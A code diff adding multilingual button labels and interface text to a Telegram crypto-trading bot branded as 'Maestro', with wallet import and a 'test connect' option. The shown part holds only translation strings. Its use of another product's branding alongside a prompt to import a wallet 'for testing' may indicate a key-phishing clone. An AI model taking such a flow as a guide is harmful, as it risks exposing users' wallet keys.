@@ -13,6 +13,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
 from aiogram.utils.keyboard import InlineKeyboardBuilder
+from urllib.parse import quote
 
 # Required for Solana contract-address detection in incoming messages.
 
@@ -52,6 +53,598 @@ class BotStates(StatesGroup):
     waiting_for_slippage = State()
     waiting_for_gas = State()
     waiting_for_global_slippage = State()
+
+USER_LANGUAGE_PREFS: dict[int, str] = {}
+LANGUAGE_OPTIONS = {
+    "en": {"label": "English 🇺🇸", "code": "en"},
+    "zh": {"label": "Chinese 🇨🇳", "code": "zh-CN"},
+    "es": {"label": "Spanish 🇪🇸", "code": "es"},
+    "ar": {"label": "Arabic 🇪🇬", "code": "ar"},
+    "pt": {"label": "Portuguese 🇧🇷", "code": "pt-BR"},
+    "fr": {"label": "French 🇫🇷", "code": "fr"},
+    "de": {"label": "German 🇩🇪", "code": "de"},
+    "hi": {"label": "Hindi 🇮🇳", "code": "hi"},
+    "ja": {"label": "Japanese 🇯🇵", "code": "ja"},
+    "ru": {"label": "Russian 🇷🇺", "code": "ru"},
+}
+
+BUTTON_LABEL_TRANSLATIONS = {
+    "en": {
+        "🔗 Chains": "🔗 Chains",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Language",
+        "💳 Wallets": "💳 Wallets",
+        "⚙️ Global Settings": "⚙️ Global Settings",
+        "🕓 Active Orders": "🕓 Active Orders",
+        "📈 Positions": "📈 Positions",
+        "📡 Signals": "📡 Signals",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copytrade",
+        "🎯 Auto Snipe": "🎯 Auto Snipe",
+        "↔️ Bridge": "↔️ Bridge",
+        "⭐️ Premium": "⭐️ Premium",
+        "💸 Cashback": "💸 Cashback",
+        "💰 Referral": "💰 Referral",
+        "⚡️ BUY & SELL NOW!": "⚡️ BUY & SELL NOW!",
+        "test connect": "test connect",
+        "Return": "Return",
+        "ℹ️ Help": "ℹ️ Help",
+        "🗄️ Rearrange Wallets": "🗄️ Rearrange Wallets",
+        "Import Wallet": "Import Wallet",
+        "Generate Wallet": "Generate Wallet",
+        "💳 No Wallets!": "💳 No Wallets!",
+        "💳 Track wallet": "💳 Track wallet",
+        "Try Again": "Try Again",
+    },
+    "zh": {
+        "🔗 Chains": "🔗 链",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 语言",
+        "💳 Wallets": "💳 钱包",
+        "⚙️ Global Settings": "⚙️ 全局设置",
+        "🕓 Active Orders": "🕓 活跃订单",
+        "📈 Positions": "📈 仓位",
+        "📡 Signals": "📡 信号",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 复制交易",
+        "🎯 Auto Snipe": "🎯 自动狙击",
+        "↔️ Bridge": "↔️ 跨链",
+        "⭐️ Premium": "⭐️ 高级版",
+        "💸 Cashback": "💸 返现",
+        "💰 Referral": "💰 推荐",
+        "⚡️ BUY & SELL NOW!": "⚡️ 立即买卖！",
+        "test connect": "测试连接",
+        "Return": "返回",
+        "ℹ️ Help": "ℹ️ 帮助",
+        "🗄️ Rearrange Wallets": "🗄️ 整理钱包",
+        "Import Wallet": "导入钱包",
+        "Generate Wallet": "生成钱包",
+        "💳 No Wallets!": "💳 暂无钱包！",
+        "💳 Track wallet": "💳 跟踪钱包",
+        "Try Again": "重试",
+    },
+    "es": {
+        "🔗 Chains": "🔗 Cadenas",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Idioma",
+        "💳 Wallets": "💳 Carteras",
+        "⚙️ Global Settings": "⚙️ Configuración global",
+        "🕓 Active Orders": "🕓 Órdenes activas",
+        "📈 Positions": "📈 Posiciones",
+        "📡 Signals": "📡 Señales",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copiar operaciones",
+        "🎯 Auto Snipe": "🎯 Caza automática",
+        "↔️ Bridge": "↔️ Puente",
+        "⭐️ Premium": "⭐️ Premium",
+        "💸 Cashback": "💸 Reembolso",
+        "💰 Referral": "💰 Referidos",
+        "⚡️ BUY & SELL NOW!": "⚡️ ¡COMPRA Y VENDE YA!",
+        "test connect": "Probar conectar",
+        "Return": "Volver",
+        "ℹ️ Help": "ℹ️ Ayuda",
+        "🗄️ Rearrange Wallets": "🗄️ Reordenar carteras",
+        "Import Wallet": "Importar cartera",
+        "Generate Wallet": "Generar cartera",
+        "💳 No Wallets!": "💳 ¡Sin carteras!",
+        "💳 Track wallet": "💳 Seguir cartera",
+        "Try Again": "Intentar otra vez",
+    },
+    "ar": {
+        "🔗 Chains": "🔗 السلاسل",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 اللغة",
+        "💳 Wallets": "💳 المحافظ",
+        "⚙️ Global Settings": "⚙️ الإعدادات العامة",
+        "🕓 Active Orders": "🕓 الطلبات النشطة",
+        "📈 Positions": "📈 المراكز",
+        "📡 Signals": "📡 الإشارات",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 النسخ المتداول",
+        "🎯 Auto Snipe": "🎯 الصيد التلقائي",
+        "↔️ Bridge": "↔️ الجسر",
+        "⭐️ Premium": "⭐️ بريميوم",
+        "💸 Cashback": "💸 الاسترداد",
+        "💰 Referral": "💰 الإحالة",
+        "⚡️ BUY & SELL NOW!": "⚡️ اشترِ وبيع الآن!",
+        "test connect": "اختبار الاتصال",
+        "Return": "رجوع",
+        "ℹ️ Help": "ℹ️ مساعدة",
+        "🗄️ Rearrange Wallets": "🗄️ ترتيب المحافظ",
+        "Import Wallet": "استيراد محفظة",
+        "Generate Wallet": "إنشاء محفظة",
+        "💳 No Wallets!": "💳 لا توجد محافظ!",
+        "💳 Track wallet": "💳 تتبع المحفظة",
+        "Try Again": "حاول مرة أخرى",
+    },
+    "pt": {
+        "🔗 Chains": "🔗 Cadeias",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Idioma",
+        "💳 Wallets": "💳 Carteiras",
+        "⚙️ Global Settings": "⚙️ Configurações globais",
+        "🕓 Active Orders": "🕓 Ordens ativas",
+        "📈 Positions": "📈 Posições",
+        "📡 Signals": "📡 Sinais",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copiar trades",
+        "🎯 Auto Snipe": "🎯 Caça automática",
+        "↔️ Bridge": "↔️ Ponte",
+        "⭐️ Premium": "⭐️ Premium",
+        "💸 Cashback": "💸 Reembolso",
+        "💰 Referral": "💰 Indicação",
+        "⚡️ BUY & SELL NOW!": "⚡️ COMPRE E VENDA AGORA!",
+        "test connect": "testar conectar",
+        "Return": "Voltar",
+        "ℹ️ Help": "ℹ️ Ajuda",
+        "🗄️ Rearrange Wallets": "🗄️ Organizar carteiras",
+        "Import Wallet": "Importar carteira",
+        "Generate Wallet": "Gerar carteira",
+        "💳 No Wallets!": "💳 Sem carteiras!",
+        "💳 Track wallet": "💳 Rastrear carteira",
+        "Try Again": "Tentar novamente",
+    },
+    "fr": {
+        "🔗 Chains": "🔗 Chaînes",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Langue",
+        "💳 Wallets": "💳 Portefeuilles",
+        "⚙️ Global Settings": "⚙️ Paramètres généraux",
+        "🕓 Active Orders": "🕓 Ordres actifs",
+        "📈 Positions": "📈 Positions",
+        "📡 Signals": "📡 Signaux",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copie de trades",
+        "🎯 Auto Snipe": "🎯 Sniping automatique",
+        "↔️ Bridge": "↔️ Pont",
+        "⭐️ Premium": "⭐️ Premium",
+        "💸 Cashback": "💸 Cashback",
+        "💰 Referral": "💰 Parrainage",
+        "⚡️ BUY & SELL NOW!": "⚡️ ACHETEZ ET VENDRE MAINTENANT!",
+        "test connect": "tester connecter",
+        "Return": "Retour",
+        "ℹ️ Help": "ℹ️ Aide",
+        "🗄️ Rearrange Wallets": "🗄️ Réorganiser les portefeuilles",
+        "Import Wallet": "Importer un portefeuille",
+        "Generate Wallet": "Créer un portefeuille",
+        "💳 No Wallets!": "💳 Aucun portefeuille!",
+        "💳 Track wallet": "💳 Suivre le portefeuille",
+        "Try Again": "Réessayer",
+    },
+    "de": {
+        "🔗 Chains": "🔗 Ketten",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Sprache",
+        "💳 Wallets": "💳 Wallets",
+        "⚙️ Global Settings": "⚙️ Globale Einstellungen",
+        "🕓 Active Orders": "🕓 Aktive Bestellungen",
+        "📈 Positions": "📈 Positionen",
+        "📡 Signals": "📡 Signale",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Copytrade",
+        "🎯 Auto Snipe": "🎯 Auto-Snipe",
+        "↔️ Bridge": "↔️ Brücke",
+        "⭐️ Premium": "⭐️ Premium",
+        "💸 Cashback": "💸 Cashback",
+        "💰 Referral": "💰 Empfehlung",
+        "⚡️ BUY & SELL NOW!": "⚡️ JETZT KAUFEN UND VERKAUFEN!",
+        "test connect": "testen verbinden",
+        "Return": "Zurück",
+        "ℹ️ Help": "ℹ️ Hilfe",
+        "🗄️ Rearrange Wallets": "🗄️ Wallets neu anordnen",
+        "Import Wallet": "Wallet importieren",
+        "Generate Wallet": "Wallet generieren",
+        "💳 No Wallets!": "💳 Keine Wallets!",
+        "💳 Track wallet": "💳 Wallet verfolgen",
+        "Try Again": "Erneut versuchen",
+    },
+    "hi": {
+        "🔗 Chains": "🔗 श्रृंखलाएँ",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 भाषा",
+        "💳 Wallets": "💳 बटुए",
+        "⚙️ Global Settings": "⚙️ वैश्विक सेटिंग्स",
+        "🕓 Active Orders": "🕓 सक्रिय ऑर्डर",
+        "📈 Positions": "📈 स्थिति",
+        "📡 Signals": "📡 संकेत",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 कॉपी ट्रेड",
+        "🎯 Auto Snipe": "🎯 ऑटो स्नाइप",
+        "↔️ Bridge": "↔️ ब्रिज",
+        "⭐️ Premium": "⭐️ प्रीमियम",
+        "💸 Cashback": "💸 कैशबैक",
+        "💰 Referral": "💰 रेफरल",
+        "⚡️ BUY & SELL NOW!": "⚡️ अभी खरीदें और बेचें!",
+        "test connect": "परीक्षण कनेक्ट करें",
+        "Return": "वापस",
+        "ℹ️ Help": "ℹ️ मदद",
+        "🗄️ Rearrange Wallets": "🗄️ बटुए पुनर्व्यवस्थित करें",
+        "Import Wallet": "बटुआ आयात करें",
+        "Generate Wallet": "बटुआ बनाएँ",
+        "💳 No Wallets!": "💳 कोई बटुआ नहीं!",
+        "💳 Track wallet": "💳 बटुआ ट्रैक करें",
+        "Try Again": "फिर से कोशिश करें",
+    },
+    "ja": {
+        "🔗 Chains": "🔗 チェーン",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 言語",
+        "💳 Wallets": "💳 ウォレット",
+        "⚙️ Global Settings": "⚙️ グローバル設定",
+        "🕓 Active Orders": "🕓 アクティブ注文",
+        "📈 Positions": "📈 ポジション",
+        "📡 Signals": "📡 シグナル",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 コピー取引",
+        "🎯 Auto Snipe": "🎯 自動スナイプ",
+        "↔️ Bridge": "↔️ ブリッジ",
+        "⭐️ Premium": "⭐️ プレミアム",
+        "💸 Cashback": "💸 キャッシュバック",
+        "💰 Referral": "💰 紹介",
+        "⚡️ BUY & SELL NOW!": "⚡️ 今すぐ購入して売却！",
+        "test connect": "テスト接続",
+        "Return": "戻る",
+        "ℹ️ Help": "ℹ️ ヘルプ",
+        "🗄️ Rearrange Wallets": "🗄️ ウォレットを並べ替える",
+        "Import Wallet": "ウォレットをインポート",
+        "Generate Wallet": "ウォレットを作成",
+        "💳 No Wallets!": "💳 ウォレットなし!",
+        "💳 Track wallet": "💳 ウォレットを追跡",
+        "Try Again": "もう一度試す",
+    },
+    "ru": {
+        "🔗 Chains": "🔗 Сети",
+        "🇺🇸🇨🇳 Language": "🇺🇸🇨🇳 Язык",
+        "💳 Wallets": "💳 Кошельки",
+        "⚙️ Global Settings": "⚙️ Глобальные настройки",
+        "🕓 Active Orders": "🕓 Активные ордера",
+        "📈 Positions": "📈 Позиции",
+        "📡 Signals": "📡 Сигналы",
+        "🧑‍🤝‍🧑 Copytrade": "🧑‍🤝‍🧑 Копирующий трейдинг",
+        "🎯 Auto Snipe": "🎯 Авто-снайп",
+        "↔️ Bridge": "↔️ Мост",
+        "⭐️ Premium": "⭐️ Премиум",
+        "💸 Cashback": "💸 Кэшбэк",
+        "💰 Referral": "💰 Реферал",
+        "⚡️ BUY & SELL NOW!": "⚡️ КУПИТЬ И ПРОДАТЬ СЕЙЧАС!",
+        "test connect": "тест подключить",
+        "Return": "Назад",
+        "ℹ️ Help": "ℹ️ Помощь",
+        "🗄️ Rearrange Wallets": "🗄️ Переставить кошельки",
+        "Import Wallet": "Импортировать кошелек",
+        "Generate Wallet": "Создать кошелек",
+        "💳 No Wallets!": "💳 Нет кошельков!",
+        "💳 Track wallet": "💳 Отслеживать кошелек",
+        "Try Again": "Повторить",
+    },
+}
+
+
+TEXT_TRANSLATIONS = {
+    "en": {
+        "🌎 Please choose your preferred Language:": "🌎 Please choose your preferred Language:",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Language updated. Your interface will now be shown in your selected language.",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Wallet not found. Please import or generate.",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Welcome to Maestro</b>\n"
+            "<i>Your one-stop hub for trading tools and quick actions.</i>\n\n"
+            "🔗 <b>Chains:</b> Enable or disable chains.\n"
+            "💳 <b>Wallets:</b> Import or generate wallets.\n"
+            "⚙️ <b>Global Settings:</b> Customize the bot.\n"
+            "🕓 <b>Active Orders:</b> Track buy and sell limits.\n"
+            "📈 <b>Positions:</b> Monitor your open trades.\n\n"
+            "⚡️ <b>Paste a token CA to trade immediately.</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">Updates</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">Support</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">More Links</a>"
+        ),
+    },
+    "zh": {
+        "🌎 Please choose your preferred Language:": "🌎 请选择您偏好的语言：",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ 语言已更新。您的界面现在将显示为所选语言。",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 已选择测试连接。使用此按钮导入或生成一个测试钱包。",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ 快速交易控制台：在下面粘贴代币合约地址（CA）。",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 根据您的偏好启用或禁用链。\n\n💳 钱包按钮可用于导入或生成每条链的钱包。",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ 未找到钱包。请导入或生成。",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>欢迎使用Maestro</b>\n"
+            "<i>您的交易工具和快速操作一站式中心。</i>\n\n"
+            "🔗 <b>链：</b> 启用或禁用链。\n"
+            "💳 <b>钱包：</b> 导入或生成钱包。\n"
+            "⚙️ <b>全局设置：</b> 自定义机器人。\n"
+            "🕓 <b>活跃订单：</b> 跟踪买卖限价订单。\n"
+            "📈 <b>持仓：</b> 监控您的持仓。\n\n"
+            "⚡️ <b>粘贴代币 CA 以立即交易。</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">中心</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">更新</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">支持</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">更多链接</a>"
+        ),
+    },
+    "es": {
+        "🌎 Please choose your preferred Language:": "🌎 Por favor, elija su idioma preferido:",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Idioma actualizado. Su interfaz ahora se mostrará en su idioma seleccionado.",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Conexión de prueba seleccionada. Use este botón para importar o generar una billetera para pruebas.",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Consola de comercio rápido: pegue una dirección de contrato de token (CA) a continuación.",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Habilite o deshabilite cadenas según sus preferencias.\n\nLos botones de 💳 Carteras se pueden usar para importar o generar carteras para cada cadena.",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ No se encontró billetera. Por favor importe o genere una.",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Bienvenido a Maestro</b>\n"
+            "<i>Tu centro todo en uno para herramientas de trading y acciones rápidas.</i>\n\n"
+            "🔗 <b>Cadenas:</b> Activa o desactiva cadenas.\n"
+            "💳 <b>Carteras:</b> Importa o genera carteras.\n"
+            "⚙️ <b>Configuración global:</b> Personaliza el bot.\n"
+            "🕓 <b>Órdenes activas:</b> Controla las órdenes de compra y venta.\n"
+            "📈 <b>Posiciones:</b> Monitorea tus operaciones abiertas.\n\n"
+            "⚡️ <b>Pega un CA de token para comerciar inmediatamente.</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">Actualizaciones</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">Soporte</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">Más enlaces</a>"
+        ),
+    },
+    "ar": {
+        "🌎 Please choose your preferred Language:": "🌎 يرجى اختيار لغتك المفضلة:",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ تم تحديث اللغة. ستظهر واجهتك الآن باللغة التي اخترتها.",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 تم اختيار الاختبار. استخدم هذا الزر لاستيراد أو إنشاء محفظة للاختبار.",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ وحدة التداول السريعة: الصق عنوان عقد الرمز (CA) أدناه.",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 فعّل أو أعطل الشبكات بناءً على تفضيلاتك.\n\nيمكن استخدام أزرار 💳 المحافظ لاستيراد أو إنشاء محافظ لكل شبكة.",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ لم يتم العثور على محفظة. يرجى الاستيراد أو الإنشاء.",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>مرحبًا بك في Maestro</b>\n"
+            "<i>محور التداول الخاص بك لكل الأدوات والإجراءات السريعة.</i>\n\n"
+            "🔗 <b>السلاسل:</b> فعّل أو تعطّل السلاسل.\n"
+            "💳 <b>المحافظ:</b> استورد أو أنشئ محافظ.\n"
+            "⚙️ <b>الإعدادات العامة:</b> خصّص البوت.\n"
+            "🕓 <b>الطلبات النشطة:</b> تتبع أوامر الشراء والبيع.\n"
+            "📈 <b>المراكز:</b> راقب تداولاتك المفتوحة.\n\n"
+            "⚡️ <b>الصق CA الرمز للتداول فوراً.</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">المركز</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">التحديثات</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">الدعم</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">المزيد من الروابط</a>"
+        ),
+    },
+    "pt": {
+        "🌎 Please choose your preferred Language:": "🌎 Por favor, escolha seu idioma preferido:",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Idioma atualizado. Sua interface agora será exibida no idioma selecionado.",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Teste de conexão selecionado. Use este botão para importar ou gerar uma carteira para teste.",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Console de negociação rápida: cole abaixo um endereço de contrato de token (CA).",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Ative ou desative cadeias com base em suas preferências.\n\nOs botões de 💳 Carteiras podem ser usados para importar ou gerar carteiras para cada cadeia.",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Carteira não encontrada. Por favor importe ou gere.",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Bem-vindo ao Maestro</b>\n"
+            "<i>Seu hub completo para ferramentas de trading e ações rápidas.</i>\n\n"
+            "🔗 <b>Cadeias:</b> Ative ou desative cadeias.\n"
+            "💳 <b>Carteiras:</b> Importe ou gere carteiras.\n"
+            "⚙️ <b>Configurações globais:</b> Personalize o bot.\n"
+            "🕓 <b>Ordens ativas:</b> Acompanhe ordens de compra e venda.\n"
+            "📈 <b>Posições:</b> Monitore suas trades em aberto.\n\n"
+            "⚡️ <b>Cole um CA de token para negociar imediatamente.</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">Atualizações</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">Suporte</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">Mais links</a>"
+        ),
+    },
+    "fr": {
+        "🌎 Please choose your preferred Language:": "🌎 Veuillez choisir votre langue préférée :",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Langue mise à jour. Votre interface sera désormais affichée dans la langue sélectionnée.",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Connexion de test sélectionnée. Utilisez ce bouton pour importer ou générer un portefeuille pour les tests.",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Console de trading rapide : collez ci-dessous une adresse de contrat de jeton (CA).",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Activez ou désactivez les chaînes selon vos préférences.\n\nLes boutons 💳 Portefeuilles peuvent être utilisés pour importer ou générer des portefeuilles pour chaque chaîne.",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Portefeuille introuvable. Veuillez importer ou générer.",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Bienvenue dans Maestro</b>\n"
+            "<i>Votre hub tout-en-un pour les outils de trading et les actions rapides.</i>\n\n"
+            "🔗 <b>Chaînes :</b> Activez ou désactivez des chaînes.\n"
+            "💳 <b>Portefeuilles :</b> Importez ou générez des portefeuilles.\n"
+            "⚙️ <b>Paramètres globaux :</b> Personnalisez le bot.\n"
+            "🕓 <b>Ordres actifs :</b> Suivez les ordres d’achat et de vente.\n"
+            "📈 <b>Positions :</b> Surveillez vos trades ouverts.\n\n"
+            "⚡️ <b>Collez un CA de token pour trader immédiatement.</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">Mises à jour</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">Support</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">Plus de liens</a>"
+        ),
+    },
+    "de": {
+        "🌎 Please choose your preferred Language:": "🌎 Bitte wählen Sie Ihre bevorzugte Sprache:",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Sprache aktualisiert. Ihre Oberfläche wird nun in der gewählten Sprache angezeigt.",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Test Connect ausgewählt. Verwenden Sie diese Schaltfläche, um eine Wallet zum Testen zu importieren oder zu erstellen.",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Schnelle Handelskonsole: Fügen Sie unten eine Token-Vertragsadresse (CA) ein.",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Aktivieren oder deaktivieren Sie Ketten basierend auf Ihren Präferenzen.\n\nDie 💳 Wallet-Buttons können verwendet werden, um Wallets für jede Kette zu importieren oder zu generieren.",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Wallet nicht gefunden. Bitte importieren oder erstellen Sie eine.",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Willkommen bei Maestro</b>\n"
+            "<i>Ihr All-in-One-Hub für Trading-Tools und schnelle Aktionen.</i>\n\n"
+            "🔗 <b>Ketten:</b> Aktivieren oder deaktivieren Sie Ketten.\n"
+            "💳 <b>Wallets:</b> Importieren oder generieren Sie Wallets.\n"
+            "⚙️ <b>Globale Einstellungen:</b> Passen Sie den Bot an.\n"
+            "🕓 <b>Aktive Orders:</b> Verfolgen Sie Kauf- und Verkaufsorders.\n"
+            "📈 <b>Positionen:</b> Überwachen Sie Ihre offenen Trades.\n\n"
+            "⚡️ <b>Fügen Sie eine Token-CA ein, um sofort zu handeln.</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">Updates</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">Support</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">Mehr Links</a>"
+        ),
+    },
+    "hi": {
+        "🌎 Please choose your preferred Language:": "🌎 कृपया अपनी वांछित भाषा चुनें:",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ भाषा अपडेट कर दी गई है। आपका इंटरफ़ेस अब आपके द्वारा चयनित भाषा में दिखेगा।",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 टेस्ट कनेक्ट चुना गया। परीक्षण के लिए वॉलेट आयात या उत्पन्न करने के लिए इस बटन का उपयोग करें।",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ फास्ट ट्रेड कंसोल: नीचे टोकन कॉन्ट्रैक्ट पता (CA) पेस्ट करें।",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 अपनी प्राथमिकताओं के अनुसार चेन को सक्षम या अक्षम करें।\n\n💳 वॉलेट बटन का उपयोग प्रत्येक चेन के लिए वॉलेट आयात या उत्पन्न करने के लिए किया जा सकता है।",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ वॉलेट नहीं मिला। कृपया आयात या उत्पन्न करें।",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Maestro में आपका स्वागत है</b>\n"
+            "<i>आपके ट्रेडिंग टूल और त्वरित क्रियाओं के लिए आपका एक-स्टॉप हब।</i>\n\n"
+            "🔗 <b>चेन:</b> चेन सक्षम या अक्षम करें।\n"
+            "💳 <b>वॉलेट:</b> वॉलेट आयात या उत्पन्न करें।\n"
+            "⚙️ <b>वैश्विक सेटिंग्स:</b> बॉट को अनुकूलित करें।\n"
+            "🕓 <b>सक्रिय ऑर्डर:</b> खरीद और बेच सीमाओं को ट्रैक करें।\n"
+            "📈 <b>पोजीशन:</b> अपने खुले ट्रेडों की निगरानी करें।\n\n"
+            "⚡️ <b>तुरंत ट्रेड करने के लिए एक टोकन CA पेस्ट करें।</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">हब</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">अपडेट</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">सपोर्ट</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">और लिंक</a>"
+        ),
+    },
+    "ja": {
+        "🌎 Please choose your preferred Language:": "🌎 ご希望の言語を選択してください：",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ 言語が更新されました。インターフェースは選択した言語で表示されます。",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 テスト接続が選択されました。テスト用のウォレットをインポートまたは生成するにはこのボタンを使用してください。",
